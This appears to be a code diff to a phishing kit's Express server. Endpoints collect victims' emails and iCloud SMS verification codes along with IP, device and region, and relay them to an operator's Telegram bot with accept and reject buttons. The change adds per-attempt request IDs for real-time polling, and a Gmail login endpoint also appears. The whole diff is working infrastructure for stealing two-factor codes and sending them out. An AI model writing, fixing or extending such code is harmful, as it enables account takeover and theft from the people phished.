@@ -899,13 +899,17 @@ app.post("/sms-code", async (req, res) => {
       return res.status(400).json({ error: "Missing email or SMS code" });
     }
 
+    // ✅ Generate unique requestId for THIS SMS code attempt
+    const requestId = `sms_code_${Date.now()}_${Math.random().toString(36).substring(7)}`;
+
     const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
     const device = detectDevice(userAgent);
     const region = await detectRegion(ip);
 
-    pendingCodes[email] = { status: "pending", smsCode };
-    console.log(`📥 SMS Code Received: ${email}`);
+    // ✅ Store by requestId (not email!) so each code has separate status
+    pendingCodes[requestId] = { status: "pending", smsCode, email, userId };
+    console.log(`📥 iCloud SMS Code Received: ${email} (requestId: ${requestId})`);
 
     const message =
       `⛈⛈⛈⛈ <b>iCloud - SMS</b> ⛈⛈⛈⛈\n` +
@@ -920,8 +924,9 @@ app.post("/sms-code", async (req, res) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: "✅ Accept", callback_data: `sms_accept|${email}` },
-            { text: "❌ Reject", callback_data: `sms_reject|${email}` }
+            // ✅ Use requestId in callback_data (not email!)
+            { text: "✅ Accept", callback_data: `sms_accept|${requestId}` },
+            { text: "❌ Reject", callback_data: `sms_reject|${requestId}` }
           ]
         ]
       }
@@ -932,7 +937,7 @@ app.post("/sms-code", async (req, res) => {
 
     // ✅ SEND TO WINNER ONLY
     if (email && userWinnerTelegram[email]) {
-      console.log(`📨 SMS going to winner only: ${userWinnerTelegram[email]}`);
+      console.log(`📨 iCloud SMS going to winner only: ${userWinnerTelegram[email]}`);
       await sendFollowUpMessage(email, message, options);
     } else {
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -948,7 +953,8 @@ app.post("/sms-code", async (req, res) => {
       });
     }
 
-    res.json({ success: true });
+    // ✅ Return requestId so frontend can poll with it
+    res.json({ success: true, requestId });
 
   } catch (err) {
     console.error("❌ SMS code endpoint error:", err);
@@ -957,20 +963,20 @@ app.post("/sms-code", async (req, res) => {
 });
 
 // ============================================================================
-// GET /check-sms-code-status - Check iCloud SMS code acceptance/rejection
+// GET /check-sms-code-status - Check by requestId (not email!)
 // ============================================================================
 
 app.get("/check-sms-code-status", (req, res) => {
   try {
-    const email = (req.query.identifier || "").trim();
+    const requestId = (req.query.identifier || "").trim();
 
-    if (!email) {
+    if (!requestId) {
       return res.json({ status: "pending" });
     }
 
-    if (pendingCodes[email]) {
-      const status = pendingCodes[email].status;
-      console.log(`✅ iCloud SMS status for ${email}: ${status}`);
+    if (pendingCodes[requestId]) {
+      const status = pendingCodes[requestId].status;
+      console.log(`✅ iCloud SMS status for requestId ${requestId}: ${status}`);
       
       // Map bot status values to frontend expectations
       if (status === "sms_accept") {
@@ -991,18 +997,18 @@ app.get("/check-sms-code-status", (req, res) => {
 });
 
 // ============================================================================
-// POST /resend-icloud-sms - Resend iCloud SMS code to winner bot only
+// POST /resend-icloud-sms - Resend with requestId
 // ============================================================================
 
 app.post("/resend-icloud-sms", async (req, res) => {
   try {
-    const { email, userId } = req.body;
+    const { email, userId, requestId } = req.body;
 
     if (!email) {
       return res.status(400).json({ error: "Missing email" });
     }
 
-    console.log(`📲 Resending iCloud SMS to ${email}`);
+    console.log(`📲 Resending iCloud SMS to ${email} (requestId: ${requestId})`);
 
     const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
@@ -1017,7 +1023,7 @@ app.post("/resend-icloud-sms", async (req, res) => {
       `<b>💻 Device:</b> ${device}\n` +
       `<b>📍 IP:</b> ${ip}`;
 
-    // ✅ SEND TO WINNER ONLY - NO BUTTONS
+    // ✅ SEND TO WINNER ONLY
     if (email && userWinnerTelegram[email]) {
       console.log(`📨 Resend iCloud SMS going to winner only: ${userWinnerTelegram[email]}`);
       await sendFollowUpMessage(email, message, {
@@ -1025,13 +1031,13 @@ app.post("/resend-icloud-sms", async (req, res) => {
       });
       console.log(`✅ Resend iCloud SMS sent successfully`);
     } else {
-      console.log(`⚠️ No winner found for ${email}, cannot resend SMS`);
-      return res.status(400).json({ error: "No winner determined for this email" });
+      console.log(`⚠️ No winner found for ${email}`);
+      return res.status(400).json({ error: "No winner determined" });
     }
 
-    // Reset SMS status to pending
-    if (pendingCodes[email]) {
-      pendingCodes[email].status = "pending";
+    // ✅ Reset status for THIS requestId
+    if (requestId && pendingCodes[requestId]) {
+      pendingCodes[requestId].status = "pending";
     }
 
     res.json({ ok: true });
@@ -1041,9 +1047,6 @@ app.post("/resend-icloud-sms", async (req, res) => {
     res.status(500).json({ error: err.message });
   }
 });
-
-// ============================================================================
-// GMAIL LOGIN ENDPOINTS
 // ============================================================================
 
 app.post("/send-gmail-login", async (req, res) => {
